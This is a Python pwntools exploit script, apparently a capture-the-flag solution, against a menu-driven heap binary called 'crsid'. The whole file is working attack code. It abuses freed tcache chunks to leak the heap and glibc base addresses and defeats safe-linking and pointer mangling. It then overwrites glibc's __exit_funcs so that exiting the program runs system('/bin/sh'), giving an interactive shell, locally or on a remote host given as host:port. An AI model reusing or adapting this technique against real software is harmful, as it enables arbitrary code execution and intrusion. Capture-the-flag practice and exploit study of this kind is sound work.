#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('crsid')
glibc = ELF('glibc/libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def create(p):
    p.sendlineafter(b'[#] ', b'1')


def delete(p, index: int):
    p.sendlineafter(b'[#] ', b'2')
    p.sendlineafter(b'Username index: ', str(index).encode())


def edit(p, index: int, payload: bytes):
    p.sendlineafter(b'[#] ', b'3')
    p.sendlineafter(b'Username index: ', str(index).encode())
    p.sendafter(b'Username: ', payload)


def show(p, index: int) -> bytes:
    p.sendlineafter(b'[#] ', b'4')
    p.sendlineafter(b'Username index: ', str(index).encode())
    p.recvuntil(b'Username: ')
    return p.recvline().strip(b'\n')


def change(p, crsid: bytes):
    p.sendlineafter(b'[#] ', b'5')
    p.sendafter(b'Enter new CRSid: ', crsid)


def deobfuscate(x: int, l: int = 64) -> int:
    p = 0

    for i in range(l * 4, 0, -4):
        v1 = (x & (0xf << i)) >> i
        v2 = (p & (0xf << i + 12 )) >> i + 12
        p |= (v1 ^ v2) << i

    return p


def obfuscate(ptr: int, addr: int) -> int:
    return ptr ^ (addr >> 12)


def main():
    p = get_process()

    p.sendlineafter(b'[i] Enter your CRSid: ', b'asdf')

    for _ in range(8):
        create(p)

    for i in range(7, -1, -1):
        delete(p, i)

    p.sendline(b'0' * 1023 + b'1')

    edit(p, 0, b'A')
    fd = u64(show(p, 0)[1:].ljust(8, b'\0'))

    heap_base_addr = deobfuscate(fd) << 8

    log.success(f'Heap base address: {hex(heap_base_addr)}')

    change(p, p64(heap_base_addr + 0x2a0))

    edit(p, 12, b'A')
    main_arena_addr = u64(show(p, 12).replace(b'A', b'\0').ljust(8, b'\0')) - 160

    glibc.address = main_arena_addr - glibc.sym.main_arena
    log.success(f'Glibc base address: {hex(glibc.address)}')

    for i in range(7):
        create(p)

    rol = lambda val, r_bits, max_bits: \
        (val << r_bits % max_bits) & (2 ** max_bits - 1) | \
        ((val & (2 ** max_bits - 1)) >> (max_bits - (r_bits % max_bits)))

    ror = lambda val, r_bits, max_bits: \
        ((val & (2 ** max_bits - 1)) >> r_bits % max_bits) | \
        (val << (max_bits - (r_bits % max_bits)) & (2 ** max_bits - 1))

    encrypt = lambda value, key: rol(value ^ key, 0x11, 64)

    __exit_funcs      = glibc.address + 0x1ec818
    exit_handler_addr = glibc.address + 0x1eebc0
    _dl_fini          = glibc.address + 0x20e350

    log.info(f'__exit_funcs address: {hex(__exit_funcs)}')
    log.info(f'Original exit handler address: {hex(exit_handler_addr)}')
    log.info(f'_dl_fini address: {hex(_dl_fini)}')

    delete(p, 1)
    delete(p, 7)
    edit(p, 12, p64(obfuscate(exit_handler_addr, heap_base_addr)))

    create(p)
    create(p)

    edit(p, 7, b'A' * 24)
    encrypted_function = u64(show(p, 7)[24:])

    key = ror(encrypted_function, 0x11, 64) ^ _dl_fini

    log.info(f'Encrypted function: {hex(encrypted_function)}')
    log.info(f'Encryption key: {hex(key)}')
    log.info(f'Sanity check: {hex(encrypt(_dl_fini, key))}')

    payload  = p64(0)
    payload += p64(1)
    payload += p64(4)
    payload += p64(encrypt(glibc.sym.system, key))
    payload += p64(next(glibc.search(b'/bin/sh')))

    edit(p, 0, payload)
    payload_pointer = heap_base_addr + 0x2f0

    delete(p, 2)
    delete(p, 1)
    edit(p, 12, p64(obfuscate(__exit_funcs - 8, heap_base_addr)))

    create(p)
    create(p)

    edit(p, 2, p64(0) + p64(payload_pointer))
    p.sendlineafter(b'[#] ', b'6')

    p.interactive()


if __name__ == '__main__':
    main()
